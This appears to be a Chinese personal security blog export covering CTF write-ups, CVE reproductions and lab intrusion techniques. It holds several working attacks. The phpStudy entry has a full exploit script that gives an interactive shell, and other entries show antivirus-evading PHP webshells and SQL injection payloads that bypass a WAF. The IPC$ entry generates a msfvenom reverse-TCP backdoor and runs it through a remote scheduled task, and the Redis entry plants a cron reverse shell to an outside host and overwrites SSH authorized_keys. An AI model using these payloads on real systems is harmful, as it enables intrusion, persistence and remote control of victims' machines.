    <content type="text"><![CDATA[漏洞简介该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。利用该漏洞很容易就可以提升权限到SYSTEM 漏洞影响范围Windows 2008r2 7601 link OPENED AS SYSTEMWindows 2012r2 9600 link OPENED AS SYSTEMWindows 2016 14393 link OPENED AS SYSTEMWindows 2019 17763 link NOT openedWindows 7 SP1 7601 link OPENED AS SYSTEMWindows 8 9200 link OPENED AS SYSTEMWindows 8.1 9600 link OPENED AS SYSTEMWindows 10 1511 10240 link OPENED AS SYSTEMWindows 10 1607 14393 link OPENED AS SYSTEMWindows 10 1703 15063 link NOT openedWindows 10 1709 16299 link NOT opened 漏洞复现Windows 2012 Windows 7 Windows 2008r2 工具https://github.com/jas502n/CVE-2019-1388/]]></content>
      <categories>
        <category>技术实战</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过D]]></title>
    <url>%2F2019%2F11%2F26%2F%E8%BF%87D%2F</url>
    <content type="text"><![CDATA[引言在打nctf的时候,由一道ctf题目引发的过D盾的思路 过Dget_defined_functions()函数会返回一个2维数组,里面包括了所有的函数,还有自定义的函数 这里就有2个思路了一个是通过自己写的函数去执行,或者可以通过自带的函数例如assert去执行先写一个自带的函数去执行内容的代码 123&lt;?php$a=get_defined_functions();$a['internal'][850]($_GET['a']); //850是assert函数的位置 被杀了,说是变量函数,然后测试了一下发现填什么都会报这个,最后在试了一下填函数的话他只是报了个1,而且这个一级只要随便填充点垃圾数据就过去了 图片语法肯定是错的,只是想说明填函数不容易被杀。既然填函数不容易被杀,那么我们是不是可以找一个获取指定字符串在数组中位置的函数。也就是array_search这个函数 最终的代码 1234&lt;?php$a=get_defined_functions();$a['internal'][array_search('assert',$a['internal'])]($_GET['a']);?&gt; 深入研究其实主要原因是并不是因为get_defined_functions是偏僻函数,而是因为D盾对函数检测的返回值没有特别严格,例如 1234&lt;?php$a[0]='assert';$a[array_search('assert',$a)]($_GET['a']);?&gt; 还有就是我在星球分享绕过D盾的思路那篇文章,也是利用函数返回值绕过D盾的。所以我们可以多利用函数的返回值进行绕过。]]></content>
      <categories>
        <category>技术实战</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019nctf wp(web,misc)]]></title>
    <url>%2F2019%2F11%2F24%2Fnctf%2F</url>
    <content type="text"><![CDATA[WEBFake XML cookbook题目已经说了flag在根目录,所以只要用XXE访问到根目录就可以了 easyphp简单的代码看了一下他一共有3个关卡,1.传入的num的值不可以等于23333,并且这个值要被正则表达式/^23333$/匹配到2.传入str1和str2的md5值不可以一样,但是经过strtr函数替换后的md5值要一样3.传入的参数不可以大于8个字符,参数中不可以包含_字符,然后对$cmd用空额进行分割里面的参数不可以出现cat命令 解题思路:1.在传入换行符的时候,可以让/^$/匹配到(fuzz发现的),所以我们主要传入23333%0a就可以绕过第一关2.如果一个md5是0e开头且后面都是数字的2个md5进行弱类型比较的时候,会一样,因为strtr函数里面他回把c替换为0,所以我们只要找到ce开头的且后面都是数字的md5值就可以绕过3.在传入get参数时,如果参数包括.就会自动替换为_,因为我们传入的字符不可以大于8并且不可以用cat命令,那么我们可以用tac(查看内容并且进行反转)代替cat,然后我们可以用通配符*来减短长度 绕过第一关传入参数num=23333%0a 绕过第二关我们可以用脚本进行爆破md5值脚本 123456&lt;?phpfor($i=0;$i&lt;100000000000;$i++)&#123; if(preg_match("/^ce\d&#123;30&#125;$/",md5($i))) echo $i."\n";&#125;?&gt; 传入参数str1=586180707&amp;str2=1000766792 绕过第三我们要先查看flag文件在哪里,传入参数q.w.q=ls因为当前只有一个f开头的文件,所以我们可以用通配符*来绕过长度限制,传入参数q.w.q=tac f*然后在用linux把内容反过来,就可以拿到flag replace打开页面发现就是一个替换字符串的,然后在随便乱点是时候看到了一个hint.php刚开始看到还有点懵,然后在无意间在替换的时候,发现他报错了然后看到报错信息,有个preg_replace正则替换函数,然后上面php5.6就想到了,他应该是有用/e去匹配,然后有对替换的内容进行eval处理,导致命令执行 先执行一个phpinfo()然后执行命令的时候发现被拦截了然后通过fuzz发现,会过滤’号然后可以用eval($_GET[0]),这样来执行命令就不会出现单引号然后在根目录发现flag,然后查看即可 Upload your Shell题目说要找到上传点,然后在进行骚操作。点击头像发现,有image的字样。然后点进去发现上传点观察url发现,他有可能存在文件包含,然后试着去包含/etc/passwd能不能返回内容思路就是:上传个图片里面藏有一句话木马,然后利用文件包含去包含就可以了。 在正常上传图片的时候,发现竟然被拦截了通过他拦截信息可以知道,内容不可以用&lt;?的字符,有可能是图片中包含了这些字符所以被拦截了。我们可以只取图片的头部分然后在上传(只要把中间的大部分内容给删掉就可以了,如果还提示&lt;?拦截的消息就继续删),然后再次上传。发现他说,图片上传成功但是不可以获取到flag值,那我们在里面传入一句话木马就可以了,因为他过滤了&lt;?所以我们要用其他标签代替&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;代替。最终payload 1&lt;script language="php"&gt;eval($_REQUEST[0])&lt;/script&gt; 提示上传成功然后用文件包含去包含就可以拿到flag了 hacker_backdoor题目说:黑客写的一句话木马,然后我们要利用一句话木马去执行命令然后通过简单的审计,有2个条件1.要指定一个存在的目录2.不可以出现函数的字符串 其实绕过也很简单 ./目录这个代表当前文件,所以肯定是存在的 既然我们不可以传入函数字符串,那么我们可以对函数的字符串进行拆分,然后在执行(php有变量函数这种语法) 首页执行一个phpinfo命令,传入如下payload$a=&#39;php&#39;;$a.=&#39;info&#39;;$a();命令执行成功,但是通过disable_functions发现禁用了大部分命令执行函数,和其他文件操作的函数,但是经过黑名单对比,发现了漏了一个命令执行函数proc_open(),然后查看别人使用方法 1234567891011&lt;?php $test = "whoami"; $array =array( array("pipe","r"), //标准输入 array("pipe","w"), //标准输出内容 array("pipe","w") //标准输出错误 ); $fp = proc_open($test,$array,$pipes); //打开一个进程通道 echo stream_get_contents($pipes[1]); //为什么是$pipes[1]，因为1是输出内容 proc_close($fp); 然后因为一些限制,例如array他不是一个函数所以就不可以用变量函数来代替,然后就替换为了[]来代替数组,还有echo也是一样,但是可以用print_r来代替。因为里面的一些变量和字符串也存在函数名,所以也要替换。最后修改后的payload 1234567891011121314151617&lt;?php$test = &quot;whoami&quot;;$p=&quot;pr&quot;;$p.=&apos;oc_&apos;;$p.=&apos;open&apos;;$ec=&quot;prin&quot;;$ec.=&quot;t_r&quot;;$s=&apos;st&apos;;$s.=&apos;r&apos;;$s.=&apos;eam&apos;;$s.=&apos;_ge&apos;;$s.=&apos;t_co&apos;;$s.=&apos;nten&apos;;$s.=&apos;ts&apos;;$array = [[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;r&quot;],[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;w&quot;],[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;w&quot;]];$fp = $p($test,$array,$pes);$ec($s($pes[1])); 然后去掉换行符并且进行进行url编码最后变成 1$test%20=%20%22whoami%22;$p%20=%20%22pr%22;$p.=%27oc_%27;$p.=%27open%27;$ec=%22prin%22;$ec.=%22t_r%22;$s=%27st%27;$s.=%27r%27;$s.=%27eam%27;$s.=%27_ge%27;$s.=%27t_co%27;$s.=%27nten%27;$s.=%27ts%27;$array%20=%20[[%22p%22.%22i%22.%22pe%22,%22r%22],[%22p%22.%22i%22.%22pe%22,%22w%22],[%22p%22.%22i%22.%22pe%22,%22w%22]];$fp%20=%20$p($test,$array,$pes);$ec($s($pes[1])); 命令执行成功,然后在根目录发现flag,但是有个问题出现了,他的flag不可读但是还发现里面有个readflag,然后试着打开看看里面的内容他是一个elf可执行文件,然后在里面还有/bin/cat flag的字样,猜测他就是用来查看flag的,然后运行这个elf文件 MISCa_good_idea打开就是一张图片然后用binwalk进行分析发现了他内藏其他的图片,然后进行分离(加个-e)参数发现有个hint.txt查看后经过翻译后的内容是:试着找出像素的秘密然后用Stegsolve.jar进行分析,先打个第二个图片,用里面图片组合器,选择第一张图片进行处理然后点了几下按钮,发现了二维码,扫码拿flag What’s this里面是数据包,数据非常小,就是有个传了个压缩文件打开发现是密码,然后发现是伪加密,修改16进制位,把09标志位变成00(如果有些压缩软件说这不是一个有效的压缩包,就要把http头部内容删掉)然后查看里面的文件发现了一堆base64怀疑是base64隐写,利用别人的脚本进行解密,这里打开的是1.txt记得对文件重命名 1234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open('1.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\n', '') norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '') diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == '__main__': solve_stego() 结束感言nctf给我的感觉还是不错的,虽然总排名在69,但是比以前有点进步。至少不在是签到提选手了。没有白费这1个月天天刷ctf的时间。加油!加油!!!]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql过狗(联合注入)]]></title>
    <url>%2F2019%2F10%2F10%2Fsql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)%2F</url>
    <content type="text"><![CDATA[实验环境window server 2012: 安全狗4.0 过狗首先第一步进行sql注入测试,在进行1&#39; or 1=1的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。首先来了解一下基本的原理一个字符串除0会返回NULL一个字符串除大于0的数会返回0一个字符串乘数字会大于0 那根据上面测试的结果进行sql注入测试返回了除了值等于NULL的数据没有返回数据 那来用来测试是否可以绕过安全狗1&#39; or 1=1%23被拦截1&#39;/0%23没有被拦截,返回空1&#39;/1%23没有被拦截,返回数据 第二步猜测有多少个字段 1231&apos; order 不拦截1&apos; by 不拦截1&apos; order by 拦截 可以用/*!10244by*/,来绕过,10244是通过fuzz得来的,图片的数字基本上都可以,可能大家想问为什么不用为什么不用/*!10244order*/呢,因为我没有成功。:(输入a&#39; order /*!10244by*/3%23,发现没有拦截 然后查看有效字段 1231&apos; union 不拦截1&apos; select 不拦截1&apos; union select 拦截 可以用/*!1024select*/来绕过输入1&#39; union /*!10244select*/ 1,2,3%23,发现没有被拦截然后爆数据库,因为他会匹配database()函数,所以database/**/(),不过这样也会被拦截,在看404大佬的bypass的时候是用hex(database/**/())来得到数据库名的16进制的,不过我测试发现用(database/**/())就可以了利用hex获取数据库的16进制直接获取数据库名 获取数据库表的信息输入 11&apos; union select 1,select group_concat(table_name) from information_schema.tables where table_schema=(database/**/()),3%23; 然后发现会被拦截,经过测试发现拦截的是information_schema这个关键字,我们可以加上``符号,来绕过 11&apos; union /*!10244select*/ 1,(select group_concat(table_name) from `information_schema`.tables where table_schema=(database/**/())),3%23 爆破列名 11&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and table_name=&apos;class&apos;),3%23 发现被拦截了,经过测试是在table_name=’class’这里被拦截,我们依然可以用``进行绕过。 11&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=&apos;class&apos;),3%23 发现被拦截了,然后尝试吧class转换为hex在进行绕过 11&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=0x636c617373),3%23]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>waf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋ctf题目(1)]]></title>
    <url>%2F2019%2F10%2F09%2Fi%E6%98%A5%E7%A7%8Bctf(1)%2F</url>
    <content type="text"><![CDATA[百度杯CTF比赛 九月场(Upload)页面题目:页面写着可以你可以随意上传文件,那就上传一个普通的一句话木马 12&lt;?phpeval($_REQUEST['a']); 发现上传成功,然后点击上传成功发现没有解析,猜测有可能是过滤了php这个字符串,换成短标签试一下 123&lt;?eval($_REQUEST['a']);?&gt; 发现也没有被解析怀疑还有可能过滤了&lt;?符号,不过还可以用&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;,不过php被过滤了,可以换成PhP 123&lt;script language="PhP"&gt; eval($_REQUEST['a']);&lt;/script&gt; 空白页面,php有可能解析了,然后用蚁剑连接。连接成功,也找到了flag。 百度杯CTF比赛 九月场(Code)题目页面查看url,有可能是文件包含,然后右键查看源代码,发现结果base64加密尝试输入index.php,看看会不会被包含发现成功包含了,然后用base64去解密,代码如下:从代码的注释中发现了PhpStorm,所以怀疑是文件泄露发现返回了页面,在页面中发现了其他php文件(fl3g_ichuqiu.php,index.php,config.php)然后想这利用文件包含来包含fl3g_ichuqiu.php这个文件,可是因为index.php的正则不允许有任何的符号,但是他会把config转换为_这个符号所以构造这样的payload:fl3gconfigichuqiu.php然后进行base64解码,得到源码(代码比较多,就不截图了,直接贴出来) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */error_reporting(E_ALL || ~E_NOTICE);include('config.php');# 此函数用来获取随机的字符串function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') &#123; $hash = ''; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) &#123; $hash .= $chars[mt_rand(0, $max)]; &#125; return $hash;&#125;# 此函数是一个加密函数function encrypt($txt,$key)&#123; # 此循环用来把每个字符转换为ascii码然后+10然后在变成字符 for($i=0;$i&lt;strlen($txt);$i++)&#123; $tmp .= chr(ord($txt[$i])+10); &#125; $txt = $tmp; # 获取4个随机字符 $rnd=random(4); # 将4个随机支付与$key进行加密然后赋值给$key $key=md5($rnd.$key); $s=0; # 将$txt的每个字符与$key对应的字符进行加密。(如果$txt的长度是5,只会循环5次) for($i=0;$i&lt;strlen($txt);$i++)&#123; if($s == 32) $s = 0; $ttmp .= $txt[$i] ^ $key[++$s]; &#125; # 将生成的随机字符与生成的加密字符进行拼接然后base64加密,并且将值返回 return base64_encode($rnd.$ttmp);&#125;function decrypt($txt,$key)&#123; # 先将输入进来的值进行解密 $txt=base64_decode($txt); # 因为$txt是由随机字符和密文组合起来的 # 所以前面4个字符是随机字符,$rnd取出随机字符 $rnd = substr($txt,0,4); # $txt取出密文 $txt = substr($txt,4); # 将随机字符与$key拼接,在进行md5加密 $key=md5($rnd.$key); $s=0; # 因为加密进行了异或处理,因为异或是可逆的, # 所以$txt的每个字符与$key的每个字符进行异或就可以得到$tmp的值 for($i=0;$i&lt;strlen($txt);$i++)&#123; if($s == 32) $s = 0; $tmp .= $txt[$i]^$key[++$s]; &#125; # 因为加密的时候对每个字符的ascii码进行了+10的操作 # 所以这里要将ascii码减10,在转换为字符 for($i=0;$i&lt;strlen($tmp);$i++)&#123; $tmp1 .= chr(ord($tmp[$i])-10); &#125; return $tmp1;&#125;# 对cookie里面的user这个值进行解密$username = decrypt($_COOKIE['user'],$key);# 如果解密的值是system则输出flagif ($username == 'system')&#123; echo $flag;&#125;else&#123; # 如果解密的信息不是system,则设置user的cookie,为guest加密后的内容 setcookie('user',encrypt('guest',$key)); echo "╮(╯▽╰)╭";&#125;?&gt; 在这个代码中,我们需要知道$key前6位的值,因为system长度为6所以在循环加密的时候,只会循环6次,所以知道$key的前面6位就可以了。然后else那个语句guest是5个字符,因为他是5个字符,所以可以通过这个来获取5个密文,还剩下1个密文就可以拿到flag了。解密代码 123456789101112131415161718192021222324252627282930313233343536373839#coding=utf-8# 1-14行通过异或得$key的前面5个字符guest = 'guest' # 对guest进行加密txt = ''# 对guest的每一个字符对应的ASCII码+10,然后转换对应字符for i in range(len(guest)): txt += chr(ord(guest[i])+10)# guest加密后的值,从cookie中获取cookie_guest = "WFlSShVLCh8a"# 因为加密的最后一步是加密base64加密所以这里要解密cookie_guest = cookie_guest.decode('base64')# 获取验证码,加密后的内容是由4位验证码和密文rnd = cookie_guest[:4]# 获取密文ttmp = cookie_guest[4:]key = ''# 通过异或获得$key的前面5个字符for i in range(len(guest)): key += chr(ord(ttmp[i]) ^ ord(txt[i]))# 下面是对system进行加密system = 'system'txt1 = ''# 将system的每一个字符对应的ASCII码+10,然后转换对应字符for i in range(len(system)): txt1 += chr(ord(system[i])+10)# 因为system是6位,需要6位的$key的内容,因为我们知道了$key的前面5个# 所以这里用来爆破,这里是1-f的原因是因为md5加密后的内容是1-fmd5 = '0123456789abcdef'new_key = ''# 然后对system进行加密for i in range(len(md5)): # 生成新的md5值 new_key = key+md5[i] cookie_system='' for j in range(len(system)): # 每个字符进行加密 cookie_system += chr(ord(txt1[j]) ^ ord(new_key[j])) flag = rnd + cookie_system print(flag.encode('base64').strip()) 然后把输出的值复制下来,然后用burp对cookie中的user进行爆破]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpsutdy后门复现]]></title>
    <url>%2F2019%2F09%2F24%2Fphpstudy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言phpstudy横空报出来了一个后门,通过网上的知道phpstudy2016、phpstudy2018的部分版本存在这个后门,请大家尽快修复此漏洞。(博主也中招,我的是php5.2.17和php5.4.45这2个版本) 漏洞利用攻击包如下 1234567891011GET /phpinfo.php HTTP/1.1Host: 172.16.80.119Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip,deflateaccept-charset:c3lzdGVtKCdjYWxjJyk7Accept-Language: zh-CN,zh;q=0.9Connection: close 其中主要是修改Accept-Encoding和添加accept-charset这2个头文件,Accept-Encoding这个头文件中gzip,deflate这2个单词中间后面不可以有空格。然后accept-charset这个头文件传输的是payload,pyaload是结果php的代码在加上base64加密发送 工具小菜鸡一般的我,写了一个简单的脚本。大佬们勿喷!!!,只支持python3!!!脚本如果有问题记得联系本人QQ:2804745224 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#author:错空#time: 2019-09-24import threadingimport requestsimport base64import reimport optparse&quot;&quot;&quot;此函数是用来弄一个交互式的shell的参数是目标的网站和执行的cmd命令&quot;&quot;&quot;def exp(url,cmd): cmd =&quot;echo &apos;&lt;iclby&gt;&apos;;system(&apos;&quot;+cmd+&quot;&apos;);echo &apos;&lt;/iclby&gt;&apos;;&quot; #设置payload,加一个自定义标签是为了后面正则容易匹配命令执行后的结果 cmd = base64.b64encode(cmd.encode(&apos;utf-8&apos;)) #对payload进行加密 header=&#123; #设置http头 &quot;accept-charset&quot;: cmd, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot; &#125; url = url #设置目标 try: response = requests.get(url,headers=header, timeout=10,verify=False) except: print(&quot;[-]网站访问超时!!!&quot;) exit(0) if(response.status_code!=200): print(&quot;[-]网站响应状态码不是200&quot;) exit(0) r = re.compile(&quot;&lt;iclby&gt;(.*?)&lt;/iclby&gt;&quot;,re.S) #创建正则,为了匹配执行后的命令 result = re.search(r, response.text) if(result!=None): #判断返回后的命令函数是否为空 print(result.group(1).strip()) else: poc(url) #如果没有成功就调用漏洞验证的函数 exit(0)&quot;&quot;&quot;此函数是用来漏洞验证只有一个参数,用来接收目标网址&quot;&quot;&quot;def poc(url): url = url.strip() #因为要读取文件,为了保险起见去除空格,以保证准确性 header=&#123; #设置http头 &quot;accept-charset&quot;: &quot;ZWNobyAnaWxjYnloYWhhJzs=&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot; &#125; try: response = requests.get(url, headers=header, timeout=5) except: print(&quot;[-]网站超时&quot;) exit(0) if(response.status_code!=200): print(&quot;[-]网站响应状态吗不是200&quot;) exit(0) text = response.text r = re.compile(&quot;ilc.*?yhaha&quot;,re.S) if(re.search(r,text)): print(&quot;[+]%s:存在php后门漏洞!&quot;%url) else: print(&quot;[-]不存在php后门漏洞!&quot;)def main(): parser = optparse.OptionParser(&quot;[*]Usage: 验证是否有漏洞-s加目标,漏洞利用-e加目标(exit退出交互),-f漏洞扫描,扫描文件&quot;) parser.add_option(&quot;-s&quot;,dest=&quot;scan&quot;,type=&quot;string&quot;,help=&quot;扫描是否存在漏洞&quot;) parser.add_option(&quot;-e&quot;,dest=&quot;shell&quot;,type=&quot;string&quot;,help=&quot;漏洞利用,交互式shell&quot;) parser.add_option(&quot;-f&quot;,dest=&quot;file&quot;,type=&quot;string&quot;,help=&quot;扫描文件里面的ip是否存在漏洞&quot;) (options, args) = parser.parse_args() scan = options.scan shell = options.shell d = options.file if(scan!=None): poc(scan) elif(shell!=None): result = input(&quot;请输入要执行的命令:\n&gt;&gt;&gt;&quot;) while(result != &quot;exit&quot;): exp(shell,result) result = input(&quot;&gt;&gt;&gt;&quot;) elif(d!=None): try: with open(d,&apos;r&apos;) as f: for i in f: threading.Thread(target=poc,args=(i,)).start() except FileNotFoundError: print(&quot;文件不存在,或者权限不够&quot;) else: print(parser.usage) main() 参考文章https://mp.weixin.qq.com/s/VuaJhp7vRkzEiE_8-6ecqA]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cve-2019-07-08]]></title>
    <url>%2F2019%2F09%2F08%2Fcve-2019-2708%2F</url>
    <content type="text"><![CDATA[试验环境exp下载:链接：https://pan.baidu.com/s/1ZdsFNikHnj73pMNVXpxf2Q 提取码：f58vhttps://github.com/rapid7/metasploit-framework/pull/12283/fileswidnow7靶机下载ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/Window7 sp1 IP:172.16.5.68kali msf(5.0.32) IP:172.16.5.88 拷贝exp,把利用代码拷贝到对应的文件,命令如下(如果目标已有文件,直接覆盖就可以了): 12345mv rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/mv rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/mv cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/mkdir /usr/share/metasploit-framework/modules/exploits/windows/rdp/mv cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/ 然后运行msf如果遇到如下错误,就更新msf 开始试验use exploit/windows/rdp/cve_2019_0708_bluekeep_rceset RHOSTS 172.16.5.68set LHOSTS 172.16.5.88set target 3exploit如果不成功多试验几次，可以改target的值如果报如下错误(那就自求多福了),说不定是网络问题。如果报如下错误,有可能是目录弄错了 server2008还在苦苦挣扎(蓝屏盖中盖) 参考链接https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=timeline&amp;isappinstalled=0http://www.nmd5.com/?p=409&amp;from=timeline&amp;isappinstalled=0]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPC简单攻击]]></title>
    <url>%2F2019%2F09%2F01%2FIPC%24%E5%85%A5%E4%BE%B5%2F</url>
    <content type="text"><![CDATA[IPC$攻击与目标建立远程连接: 1net use \\172.16.5.1\ipc$ /u:administrator abc.123 利用msf生成后门 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.23 LPORT=777 -f exe &gt;&gt; ppp.exe 然后利用copy命令把木马放到目标(c$代表是c盘的意思) 1copy C:\ppp.exe \\172.16.5.1\c$ 设置msf监听 123set lhost 172.16.5.23 //设置监听的ipset lport 777 //设置监听的端口exploit //开始监听 查看目标时间(后面设置定时任务要用) 1net time \\172.16.5.1 设置定时任务 1at \\172.16.5.1 11:22 C:\ppp.exe //11:22是自己设置什么时候运行 C:\ppp.exe是运行的文件 等到设定的时间就会运行文件 使用psexec工具安装下载地址: https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec下载完成后直接把工具复制到cmd的目录下第一次运行时候弹出一个框点击access就可以了 msf设置监听与上面一样然后运行命令: 1psexec \\172.16.5.1 -u administrator -p abc.123 -c c:\ppp.exe -u:用户名-p:密码-c:本地的文件作用:把本地文件复制到目标然后运行(如果已有IPC连接可以不用-u和-p参数) 推荐文章https://blog.csdn.net/u010984552/article/details/54890187https://www.cnblogs.com/baocheng/p/4020685.html?utm_source=tuicool&amp;utm_medium=referral]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>IPC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8/28(redis未授权,xctf)]]></title>
    <url>%2F2019%2F08%2F28%2Fredis%2F</url>
    <content type="text"><![CDATA[漏洞篇redis未授权访问漏洞利用环境搭建 步骤1:下载和安装 1234$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz$ tar xzf redis-2.8.17.tar.gz$ cd redis-2.8.17$ make 步骤2:启动redis服务(在redis目录下运行下面命令) 123$ service iptables stop # 防止后面因为防火墙的原因连接不了redis$ cd src$ ./redis-server ../redis.conf #可以省略后面的../redis.conf,这样的话就是默认配置 启动页面如图: 攻击机也要安装redis和步骤1一样(不用做步骤2) 如果没有安装成功可以参考此文章 然后测试一下远程连接,在攻击远程目标的redis 1$ ./redis-cli -h 172.16.5.55 如图表示连接成功: 如果没有连接成功有可能是因为bind或者设置了密码设置成了127.0.0.1,可以更改配置文件 1$ vi redis.conf 可以在前面添加一个#或者把127.0.0.1改为0.0.0.0 如图: 在requirepass添加注释 如图: 漏洞利用ssh无密码连接 讲一下ssh无密码连接的思路 1.生成ssh公钥 2.把ssh公钥传入redis缓存里面 3.修改ssh公钥 4.把redis缓存修改为/root/.ssh/ 首先用nmap工具对目标进行扫描 画箭头那里Bind是0.0.0.0表示任意ip都可以连接 我们先生成一个ssh公钥 1$ ssh-keygen -t rsa 修改ssh公钥(为了防止公钥与其他数据连接在一起) 1(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt 把key.txt添加到缓冲区 1$ cat /root/key.txt | ./redis-cli -h 172.16.5.55 -x set xxx 远程连接redis然后修改配置,然后输入如下命令 1234$ ./redis-cli -h 172.16.5.55$ config set dir /root/.ssh$ config set dbfilename authorized_keys$ save 最后连接目标服务器 如果目标是存在弱密码的我们可以用hydra进行爆破先为目标设置一个密码: 1vi redis.conf 按照如下修改然后用hydra进行爆破hydra -P pass.txt redis://172.16.5.55还可以用msf进行爆破爆破成功得到密码后就可以连接了 nc反弹shell思路与上面相同更改redis存储的文件 具体命令如下先用nc监听端口远程连接redis进行配置 1234set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.5.23/666 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 过1分钟左右就可以看到shell已经反弹过来了 xctf(web)篇php2发现什么都没有,然后有工具来了一波爆破看到了个index.phps文件,然后访问看看发现了代码泄露,通过审计发现要满足以下条件才可以拿到flag 121.$_GET[&apos;id&apos;]!==&quot;admin&quot;2.$_GET[&apos;id&apos;]===&quot;admin&quot; 这样看起来很绕,他第一次判断是否等于admin,如果等于就输出并且退出,然后中间那里有一个urldecode(),然后在判断是否大于admin如果等于的话就输出flag。所以所有的关键就在urldecode()这个函数,这个函数是用来url解码的。所以我们可以对admin进行一次urldecode然后我们只用把a变成%61然后对%61进行编码就可以绕过了(因为浏览器默认会进行一次url编码,所以我们这里还要编码一次) unserialize3题目页面:看到class类和wakeup就想到了反序列化漏洞,__wakeup会在反序列化的时候执行他里面的代码,所以要想办法绕过wakeup这里,然后wakeup有一个漏洞就是在反序列化时他的对象属性个数的值大于真实个数的属性就会跳过wakeup去执行。例如:O:4:&quot;test&quot;:1:{s:4:&quot;flag&quot;;s:4:&quot;test&quot;;}我们把1改成2他就会跳过__wakeup。因为括号里面只有1个属性,但是我们在外面说有2个属性所以他就会跳过这样题目就很简单了先对代码进行序列化得到O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}然后把属性1变成属性2最后的payload是:O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}然后提交得到flag 一些好的文章c2:https://github.com/platdrag/UnblockableChainshttps://iwantmore.pizza/posts/dnscat2-over-doh.htmlhttps://www.freebuf.com/sectool/210450.html 面试技巧:https://github.com/FeeiCN/SecurityInterviewQuestions 